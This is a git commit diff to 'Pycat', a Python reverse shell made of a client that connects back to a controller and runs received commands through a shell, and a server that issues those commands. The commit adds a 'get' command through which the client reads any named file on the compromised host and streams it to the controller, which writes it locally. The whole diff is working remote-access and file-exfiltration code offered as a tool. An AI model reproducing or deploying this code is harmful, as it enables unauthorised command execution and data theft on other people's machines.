d51d06bcb245467757b969fc7a8b91934e9dea1c
0x776F6C66 <96860148+0x776F6C66@users.noreply.github.com>
2022-07-01 17:33:44 +0300

    Add files via upload

--- Pycat/client.py
+++ Pycat/client.py
@@ -13,23 +13,42 @@ if __name__ == "__main__":
 		# create tcp ipv4 socket, try connecting to the server
 		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		client.connect((server, port))
+		
 		# recv commands and execute
 		while True:
 			try:
-				command = client.recv(1024)
+				command = client.recv(1024) #receive commands
 				if command.decode() == "": # check if the server has terminated connection
 					break
 				if command.decode().lower() == "exit": # check if the command is to terminate the connection
 					break
 
+			
+				###/////////////////////////////////////// UPLOAD FILES \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
+				if command.decode().startswith("get"):
+					file = command.decode().strip("get").strip(" ")
+					size = os.stat(file).st_size #get size of the file
+					client.send(str(size).encode())
+				
+					try: #try opening the file
+						with open(file, 'r') as f: # open file for reading
+							for a in f.read():
+								client.send(a.encode())
+							f.close()
+							continue
+					except FileNotFoundError as err: # if file is not found, catch error and send it
+							client.send(str(err).encode())
+							continue
+					
+				###/////////////////////////////////// Exececute Commands \\\\\\\\\\\\ by 0x776F6C66 @wolf \\\\\\\\\\\###
 				output = subprocess.run(command, shell=True, capture_output=True) #execute the commands
 				if output.stderr.decode() == "":
 					result = output.stdout
 				else:
 					result = output.stderr
 				client.send(result)
-			except KeyboardInterrupt:
-				break
+			except KeyboardInterrupt: #catch keyboard interrupts
+				exit()
 			except:
 				continue
 	except:
--- Pycat/server.py
+++ Pycat/server.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+from tqdm import tqdm
 import socket
 import os
 import sys
@@ -21,8 +22,8 @@ port =  int(sys.argv[1])#
 def handler():
 	tries = 0
 	try:
-		banner()
-
+		banner() #display banner
+		
 		# create tcp ipv4 socket, bind it to the ip and port, listen and accept connections
 		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #reuse the port if needed
@@ -31,43 +32,87 @@ def handler():
 		print(f"[*] Listening on {ip} port {port}")
 		conn, addr = server.accept()
 		print(f"[*] {addr[0]} connected..")
-	
+		
 		while True:
-			command = input("0x776F6C66: ") #prompt
-
+			command = input("##: ") #prompt
 			# catch empty commands and commands meant for the local machine
 			if command == "":
 				continue
 			elif command.lower() == "clear":
 				os.system("clear")
 				banner()
-				continue
-
-			# send the commands, recv output and display it
+				continue			
+			conn.send(command.encode())
+			
+			###////////////////////////////////////// DOWNLOAD FILES \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
+			if command.startswith("get"): # check if download command is set which is "get"			
+				# get the file name from the command
+				if "/" in command:
+					file = command.split("/")[-1]
+					if file == "":
+						print("Empty file")
+						continue
+				else:
+					file = command.strip("get").strip(" ").strip("/n")
+					if file == "":
+						print("Empty file")
+						continue				
+				size = conn.recv(1024)
+				if "No such file or directory" in size.decode(): # if the file is not found, throw error
+					print("No such file or directory")
+					continue
+				if not isinstance(int(size.decode()), int): # 'size' of the file is a number, if the size received is anything else, raise an error
+					print("Error getting size of the file ;)") 
+					continue
+				try:				
+					with open(file) as f: # check if file exists
+						while True:
+							overwrite = input("File exists. OVERWRITE (y/n)?") #make sure the user wishes to overwrite the file
+							if overwrite.lower() == "y":
+								x = open(file, "a+") # open the file in append mode, create if not exist
+								for i in tqdm(range(int(size.decode())), desc=file+" ..."): # the progress bar displaying the download progress
+									contents = conn.recv(1)  # receive the contents byte by byte
+									x.write(contents.decode()) #write contents to file
+								x.close()
+								break
+							if overwrite.lower() == "n": # break if user doesn't want to overwrite
+								break
+							else:    # if invalid option is chosen, stay in the loop
+								continue
+					continue
+				
+				except FileNotFoundError:
+					x = open(file, "a+") #open file in append mode, if it doesn't exist on system
+					for i in tqdm(range(int(size.decode())), desc=file+" ..."): # the progress bar displaying the dwonlo
+						contents = conn.recv(1)
+						x.write(contents.decode())
+					x.close()
+					continue
+					# send the commands, recv output and display it			
+			
+			###/////////////////////////////////// CHANGE DIRECTORIES \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
 			if command.startswith("cd"):
 				if tries == 0:
 					print("\nFrom @0x776F6C66: Apparently cd breaks the program for some umknown reasons....")
 					print("os.chdir() on the client program breaks it, other methods have been researched with no fruits..")
 					print("Try not changing into any directories ;0 \n")
 					tries = 1
-				continue
-
-			conn.send(command.encode())
-
-			if command.lower() == "exit": # terminate the connection when the user wishes
-				return "Connection terminated.. :0"
-
-			result = conn.recv(1024)
+				continue			
 			
+			###////////////////////////////////////// EXIT THE PROGRAM \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
+			if command.lower() == "exit": # terminate the connection when the user wishes
+				return "Connection terminated.. :0"			
+			
+			###////////////////////////// RECEIVE THE OUTPUT OF COMMANDS \\\\\\\\\\\\ by 0x776F6C66 @wolf \\\\\\\\### 
+			result = conn.recv(1024)
 			if result.decode() == "": # check of the client has terminated connection
 				return "Connection terminated.. :0"
-
-			print(result.decode().strip("\n"))
+			print(result.decode().strip("\n"))	
 	
 	except KeyboardInterrupt:
 		exit()
 	except:
-		return ""
+		return "error"
 	
 
 def main():
